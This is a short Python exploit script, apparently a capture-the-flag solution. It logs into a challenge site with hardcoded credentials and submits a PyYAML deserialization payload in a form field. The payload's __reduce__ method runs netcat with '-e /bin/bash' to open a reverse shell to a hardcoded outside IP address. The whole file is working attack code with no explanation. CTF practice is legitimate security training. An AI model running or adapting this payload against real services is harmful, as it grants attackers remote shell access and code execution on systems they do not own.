import yaml,subprocess,requests

class Payload(object):
	def __reduce__(self):
		return (subprocess.Popen,(tuple('nc 52.14.18.129 11979 -e /bin/bash'.split(" ")),))
deserialized_data = yaml.dump(Payload())  
data1={"username":"fwordadmin","password":"////"}
print("[+] Payload is: "+deserialized_data)
#yaml.load(deserialized_data,Loader=yaml.Loader)
data2={"service":deserialized_data}
s=requests.Session()
r=s.post("https://useless.fword.wtf/login",data=data1)
if r.status_code==200:
	print("[+] Logged in successfully")
r=s.post("https://useless.fword.wtf/home",data=data2)
print(r.text)
